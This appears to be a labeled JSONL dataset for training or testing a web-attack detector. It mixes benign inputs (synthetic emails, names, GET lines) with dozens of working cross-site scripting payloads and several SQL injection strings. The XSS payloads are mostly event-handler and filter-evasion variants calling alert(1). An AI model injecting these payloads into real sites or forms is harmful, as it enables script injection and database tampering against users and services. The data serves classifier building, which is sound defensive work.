+{"input":"Contact: whiteheadtravis@example.net","label":"benign"}
+{"input":"<style>@keyframes x{}<\/style><rb style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/rb>","label":"XSS"}
+{"input":"<plaintext onmouseout=\"alert(1)\">test<\/plaintext>","label":"XSS"}
+{"input":"Contact: udavis@example.com","label":"benign"}
+{"input":"Contact: amberarnold@example.org","label":"benign"}
+{"input":"<body id=x tabindex=1 ondeactivate=alert(1)><\/body><input id=y autofocus>","label":"XSS"}
+{"input":"<code oncut=\"alert(1)\" contenteditable>test<\/code>","label":"XSS"}
+{"input":"<footer id=x tabindex=1 onfocusin=alert(1)><\/footer>","label":"XSS"}
+{"input":"<figure id=x tabindex=1 onactivate=alert(1)><\/figure>","label":"XSS"}
+{"input":"GET \/posts\/category HTTP\/1.1","label":"benign"}
+{"input":"how to cooking tutorial","label":"benign"}
+{"input":"top 10 music blogs","label":"benign"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><select id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/select>","label":"XSS"}
+{"input":"<div id=\"97\"><!-- IE 5-9 -->","label":"XSS"}
+{"input":"<col id=x tabindex=1 onbeforeactivate=alert(1)><\/col>","label":"XSS"}
+{"input":"<spacer id=x tabindex=1 onactivate=alert(1)><\/spacer>","label":"XSS"}
+{"input":"Helpful article!","label":"benign"}
+{"input":"<rp draggable=\"true\" ondragstart=\"alert(1)\">test<\/rp>","label":"XSS"}
+{"input":"<main id=x tabindex=1 onfocusin=alert(1)><\/main>","label":"XSS"}
+{"input":"<table onmouseover=\"alert(1)\">test<\/table>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><basefont ondrop=alert(1) contenteditable>drop here<\/basefont>","label":"XSS"}
+{"input":"<td onmouseenter=\"alert(1)\">test<\/td>","label":"XSS"}
+{"input":"%22%20OR%201%20%3D%201%20--%20-","label":"SQLi"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><textarea id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/textarea>","label":"XSS"}
+{"input":"Contact: imontoya@example.net","label":"benign"}
+{"input":"<del onpaste=\"alert(1)\" contenteditable>test<\/del>","label":"XSS"}
+{"input":"al\\u0065rt(1)","label":"XSS"}
+{"input":"<i id=x tabindex=1 onfocus=alert(1)><\/i>","label":"XSS"}
+{"input":"feedback=May ever watch truth since support.","label":"benign"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><rp id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/rp>","label":"XSS"}
+{"input":"{\"user\": \"smithdiana\", \"action\": \"view\", \"timestamp\": \"2008-04-29T20:17:36\"}","label":"benign"}
+{"input":"GET \/search\/category\/categories HTTP\/1.1","label":"benign"}
+{"input":"<body id=x tabindex=1 onbeforeactivate=alert(1)><\/body>","label":"XSS"}
+{"input":"<source oncut=\"alert(1)\" contenteditable>test<\/source>","label":"XSS"}
+{"input":"Contact: derrickrodgers@example.net","label":"benign"}
+{"input":"<picture ondblclick=\"alert(1)\">test<\/picture>","label":"XSS"}
+{"input":"Hello, my name is Beverly Lewis.","label":"benign"}
+{"input":"<style>:target {color: red;}<\/style><dl id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/dl>","label":"XSS"}
+{"input":"<legend onbeforecopy=\"alert(1)\" contenteditable>test<\/legend>","label":"XSS"}
+{"input":"<head draggable=\"true\" ondragstart=\"alert(1)\">test<\/head>","label":"XSS"}
+{"input":"Hello, my name is Melanie Green.","label":"benign"}
+{"input":"Helpful tutorial!","label":"benign"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><summary ondrop=alert(1) contenteditable>drop here<\/summary>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><colgroup style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/colgroup>","label":"XSS"}
+{"input":"<embed onmouseout=\"alert(1)\">test<\/embed>","label":"XSS"}
+{"input":"<\/svg>\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"<svg><noembed onload=alert(1)><\/noembed>","label":"XSS"}
+{"input":"<ins id=x tabindex=1 ondeactivate=alert(1)><\/ins><input id=y autofocus>","label":"XSS"}
+{"input":"name=roberta76&email=codyblair@example.org","label":"benign"}
+{"input":"Interesting article!","label":"benign"}
+{"input":"{\"user\": \"johnking\", \"action\": \"edit\", \"timestamp\": \"2012-09-07T18:22:52\"}","label":"benign"}
+{"input":"<html onbeforecopy=\"alert(1)\" contenteditable>test<\/html>","label":"XSS"}
+{"input":"AnD TrUe","label":"SQLi"}
+{"input":"<svg><menuitem onload=alert(1)><\/menuitem>","label":"XSS"}
+{"input":"name=taylordouglas&email=bartonmark@example.org","label":"benign"}
+{"input":"<style>@keyframes slidein {}<\/style><dd style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/dd>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><strong ondrop=alert(1) contenteditable>drop here<\/strong>","label":"XSS"}
+{"input":"Contact: destiny79@example.org","label":"benign"}
+{"input":"<hgroup onkeypress=\"alert(1)\" contenteditable>test<\/hgroup>","label":"XSS"}
+{"input":"<var onmouseup=\"alert(1)\">test<\/var>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><template ondragover=alert(1) contenteditable>drop here<\/template>","label":"XSS"}
+{"input":"{\"user\": \"wallpam\", \"action\": \"edit\", \"timestamp\": \"1982-06-21T00:49:40\"}","label":"benign"}
+{"input":"{\"user\": \"rachel04\", \"action\": \"edit\", \"timestamp\": \"2006-07-12T23:34:45\"}","label":"benign"}
+{"input":"<abbr onmousedown=\"alert(1)\">test<\/abbr>","label":"XSS"}
+{"input":"Helpful post!","label":"benign"}
+{"input":"{\"user\": \"nicole50\", \"action\": \"view\", \"timestamp\": \"2025-01-18T17:49:27\"}","label":"benign"}
+{"input":"GET \/tag HTTP\/1.1","label":"benign"}
+{"input":"GET \/wp-content\/categories HTTP\/1.1","label":"benign"}
+{"input":"<em onblur=alert(1) tabindex=1 id=x><\/em><input autofocus>","label":"XSS"}
+{"input":"GET \/categories\/tags\/posts HTTP\/1.1","label":"benign"}
+{"input":"GET \/category HTTP\/1.1","label":"benign"}
+{"input":"Hello, my name is Steven Santana.","label":"benign"}
+{"input":"<option id=x tabindex=1 onbeforeactivate=alert(1)><\/option>","label":"XSS"}
+{"input":"\";a=prompt,a()\/\/","label":"XSS"}
+{"input":"<code onclick=\"alert(1)\">test<\/code>","label":"XSS"}
+{"input":"page=9&sort=asc","label":"benign"}
+{"input":"<style>@keyframes x{}<\/style><blockquote style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/blockquote>","label":"XSS"}
+{"input":"<picture onclick=\"alert(1)\">test<\/picture>","label":"XSS"}
+{"input":"<optgroup onkeypress=\"alert(1)\" contenteditable>test<\/optgroup>","label":"XSS"}
+{"input":"<style>@keyframes slidein {}<\/style><dialog style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/dialog>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><isindex style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/isindex>","label":"XSS"}
+{"input":"Hello, my name is Elizabeth Williams.","label":"benign"}
+{"input":"{\"user\": \"jkramer\", \"action\": \"edit\", \"timestamp\": \"2003-07-04T23:00:32\"}","label":"benign"}
+{"input":"search=top 10 cooking blogs","label":"benign"}
+{"input":"<h1 draggable=\"true\" ondragstart=\"alert(1)\">test<\/h1>","label":"XSS"}
+{"input":"Hello, my name is Harold Lambert.","label":"benign"}
+{"input":"<mark onpaste=\"alert(1)\" contenteditable>test<\/mark>","label":"XSS"}
+{"input":"Hello, my name is Emily Reyes.","label":"benign"}
+{"input":"GET \/app\/tags HTTP\/1.1","label":"benign"}
+{"input":"<font onmousemove=\"alert(1)\">test<\/font>","label":"XSS"}
+{"input":"<style>:target {color: red;}<\/style><title id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/title>","label":"XSS"}
+{"input":"tnemmoc LQS    - --","label":"SQLi"}
+{"input":"{\"user\": \"lbarrera\", \"action\": \"edit\", \"timestamp\": \"2009-01-29T21:25:57\"}","label":"benign"}
+{"input":"<kbd onmousemove=\"alert(1)\">test<\/kbd>","label":"XSS"}
+{"input":"<meter onblur=alert(1) tabindex=1 id=x><\/meter><input autofocus>","label":"XSS"}
+{"input":"<input autofocus onfocusin=alert(1)>","label":"XSS"}
+{"input":"<style>@keyframes slidein {}<\/style><s style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/s>","label":"XSS"}
+{"input":"cooking examples in 2025","label":"benign"}
+{"input":"<button draggable=\"true\" ondragenter=\"alert(1)\">test<\/button>","label":"XSS"}
+{"input":"<META HTTP-EQUIV=\"Link\" Content=\"<http:\/\/ha.ckers.org\/xss.css>; REL=stylesheet\">","label":"XSS"}
+{"input":"<menuitem draggable=\"true\" ondragleave=\"alert(1)\">test<\/menuitem>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><meta ondragover=alert(1) contenteditable>drop here<\/meta>","label":"XSS"}
+{"input":"{\"user\": \"shall\", \"action\": \"download\", \"timestamp\": \"2018-08-17T23:50:55\"}","label":"benign"}
+{"input":"Hello, my name is Samantha Goodwin.","label":"benign"}
+{"input":"{\"user\": \"john81\", \"action\": \"edit\", \"timestamp\": \"1987-02-23T06:33:34\"}","label":"benign"}
+{"input":"<canvas id=x tabindex=1 onactivate=alert(1)><\/canvas>","label":"XSS"}
+{"input":"<bgsound id=x tabindex=1 onactivate=alert(1)><\/bgsound>","label":"XSS"}
+{"input":"<div id=\"118\"><div draggable=\"true\" ondragstart=\"event.dataTransfer.setData('text\/plain','malicious code');\"><h1>Drop me<\/h1><\/div>","label":"XSS"}
+{"input":"<embed onmousedown=\"alert(1)\">test<\/embed>","label":"XSS"}
+{"input":"1=1 RO","label":"SQLi"}
+{"input":"<style>:target {color:red;}<\/style><del id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/del>","label":"XSS"}
+{"input":"name=vbecker&email=vanessa87@example.org","label":"benign"}
+{"input":"'%22--%3E%3C\/style%3E%3C\/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C\/script%3E","label":"XSS"}
+{"input":"<font oncopy=\"alert(1)\" contenteditable>test<\/font>","label":"XSS"}
+{"input":"' Or '' = '","label":"SQLi"}
+{"input":"<col onblur=alert(1) tabindex=1 id=x><\/col><input autofocus>","label":"XSS"}
+{"input":"<del onkeyup=\"alert(1)\" contenteditable>test<\/del>","label":"XSS"}
+{"input":"`        bAcKtIcK","label":"SQLi"}
+{"input":"<svg xmlns=\"http:\/\/www.w3.org\/2000\/svg\">","label":"XSS"}
+{"input":"Hello, my name is Heather White.","label":"benign"}
+{"input":"Hello, my name is Harold Davis.","label":"benign"}
+{"input":"a=alert,a(1)","label":"XSS"}
+{"input":"best cooking books","label":"benign"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><keygen id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/keygen>","label":"XSS"}
+{"input":"<noframes oncontextmenu=\"alert(1)\">test<\/noframes>","label":"XSS"}
+{"input":"<kbd oncut=\"alert(1)\" contenteditable>test<\/kbd>","label":"XSS"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><table id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/table>","label":"XSS"}
+{"input":"<output draggable=\"true\" ondrag=\"alert(1)\">test<\/output>","label":"XSS"}
